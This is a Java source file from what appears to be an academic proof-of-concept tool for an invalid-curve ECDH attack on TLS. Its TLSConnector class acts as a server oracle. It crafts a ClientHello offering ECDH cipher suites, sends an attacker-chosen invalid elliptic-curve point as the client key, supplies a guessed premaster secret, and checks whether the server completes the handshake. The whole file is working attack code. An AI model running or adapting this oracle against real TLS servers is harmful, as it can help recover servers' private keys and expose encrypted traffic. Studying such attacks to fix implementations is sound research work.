package de.rub.nds.ecdhattack.oracle;

import de.rub.nds.ecdhattack.utilities.*;
import de.rub.nds.ssl.stack.protocols.alert.Alert;
import de.rub.nds.ssl.stack.protocols.alert.datatypes.EAlertDescription;
import de.rub.nds.ssl.stack.protocols.commons.ECipherSuite;
import de.rub.nds.ssl.stack.protocols.commons.EProtocolVersion;
import de.rub.nds.ssl.stack.protocols.handshake.ClientHello;
import de.rub.nds.ssl.stack.protocols.handshake.ClientKeyExchange;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.CipherSuites;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.EKeyExchangeAlgorithm;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.Extensions;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
import de.rub.nds.ssl.stack.protocols.handshake.extensions.EllipticCurves;
import de.rub.nds.ssl.stack.protocols.handshake.extensions.SupportedPointFormats;
import de.rub.nds.ssl.stack.protocols.handshake.extensions.datatypes.ClientECDHPublic;
import de.rub.nds.ssl.stack.protocols.handshake.extensions.datatypes.ECPoint;
import de.rub.nds.ssl.stack.protocols.handshake.extensions.datatypes.EECPointFormat;
import de.rub.nds.ssl.stack.protocols.handshake.extensions.datatypes.ENamedCurve;
import de.rub.nds.ssl.stack.trace.MessageContainer;
import de.rub.nds.ssl.stack.workflows.TLS10HandshakeWorkflow;
import static de.rub.nds.ssl.stack.workflows.TLS10HandshakeWorkflow.EStates.ALERT;
import static de.rub.nds.ssl.stack.workflows.TLS10HandshakeWorkflow.EStates.CLIENT_HELLO;
import static de.rub.nds.ssl.stack.workflows.TLS10HandshakeWorkflow.EStates.CLIENT_KEY_EXCHANGE;
import de.rub.nds.ssl.stack.workflows.commons.ObservableBridge;
import java.net.SocketException;
import java.util.Observable;
import java.util.Observer;

/**
 * <DESCRIPTION> @author Christopher Meyer - christopher.meyer@rub.de
 * @author Juraj Somorovsky
 * @version 0.1
 *
 * Sep 20, 2013
 */
public class TLSConnector implements Observer {

    private byte[] nastyPoint;
    private int port;
    private String host;
    private TLS10HandshakeWorkflow workflow;
    private byte[] guessedPremasterSecret;
    private boolean finishedReceived;

    public TLSConnector(final String passedHost, final int passedPort) {
        host = passedHost;
        port = passedPort;
    }

    public synchronized boolean launchHandshake(
            final byte[] passedNastyPoint, final byte[] passedPremasterSecret)
            throws SocketException, InterruptedException {
        finishedReceived = false;
        nastyPoint = passedNastyPoint;
        guessedPremasterSecret = passedPremasterSecret;

        workflow = new TLS10HandshakeWorkflow(false);
        workflow.connectToTestServer(host, port);
        workflow.addObserver(this,
                TLS10HandshakeWorkflow.EStates.CLIENT_HELLO);
        workflow.addObserver(this,
                TLS10HandshakeWorkflow.EStates.CLIENT_KEY_EXCHANGE);
        workflow.addObserver(this,
                TLS10HandshakeWorkflow.EStates.CLIENT_CHANGE_CIPHER_SPEC);
        workflow.addObserver(this,
                TLS10HandshakeWorkflow.EStates.SERVER_FINISHED);
        workflow.start();
        workflow.closeSocket();

        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            // got interrupted
        }

        return finishedReceived;
    }

    /**
     * Update observed object.
     *
     * @param o Observed object
     * @param arg Arguments
     */
    @Override
    public final void update(final Observable o, final Object arg) {
        MessageContainer trace = null;
        TLS10HandshakeWorkflow.EStates states = null;
        ObservableBridge obs;
        if (o != null && o instanceof ObservableBridge) {
            obs = (ObservableBridge) o;
            states = (TLS10HandshakeWorkflow.EStates) obs.getState();
            trace = (MessageContainer) arg;
        }
        if (states != null) {
            switch (states) {
                case CLIENT_HELLO:
                    ClientHello clientHello =
                            (ClientHello) trace.getCurrentRecord();

                    CipherSuites suites = new CipherSuites();
                    suites.setSuites(new ECipherSuite[]{
                                ECipherSuite.TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA,
                                ECipherSuite.TLS_ECDH_RSA_WITH_AES_256_CBC_SHA,
                                ECipherSuite.TLS_ECDH_RSA_WITH_AES_128_CBC_SHA,
                                ECipherSuite.TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384,
                                ECipherSuite.TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256,
                                ECipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
                                ECipherSuite.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
                                ECipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
                            });
                    clientHello.setCipherSuites(suites);

                    Extensions extensions = new Extensions();
                    EllipticCurves curves = new EllipticCurves();
                    curves.setSupportedCurves(new ENamedCurve[]{
                                ENamedCurve.SECP_256_R1, ENamedCurve.SECP_192_R1
                            });
                    extensions.addExtension(curves);
                    SupportedPointFormats formats = new SupportedPointFormats();
                    formats.setSupportedPointFormats(new EECPointFormat[]{
                                EECPointFormat.UNCOMPRESSED
                            });
                    extensions.addExtension(formats);
                    clientHello.setExtensions(extensions);

                    trace.setCurrentRecord(clientHello);
                    break;
                case CLIENT_KEY_EXCHANGE:
                    ClientKeyExchange cke = new ClientKeyExchange(
                            EProtocolVersion.TLS_1_0,
                            EKeyExchangeAlgorithm.EC_DIFFIE_HELLMAN);

                    ClientECDHPublic keyMaterial = new ClientECDHPublic();
                    ECPoint newPoint = new ECPoint();
                    newPoint.setPoint(nastyPoint);
                    keyMaterial.setECDHYc(newPoint);
                    keyMaterial.setExplicitPublicValueEncoding(true);
                    cke.setExchangeKeys(keyMaterial);

                    trace.setCurrentRecord(cke);
                    break;
                case CLIENT_CHANGE_CIPHER_SPEC:
                    PreMasterSecret pms = new PreMasterSecret(EProtocolVersion.TLS_1_0);
                    pms.setEcdhKey(guessedPremasterSecret);
                    workflow.setPreMasterSecret(pms);
                    break;
                case SERVER_FINISHED:
                    finishedReceived = true;
                    break;
                default:
                    break;
            }
        }
    }
}
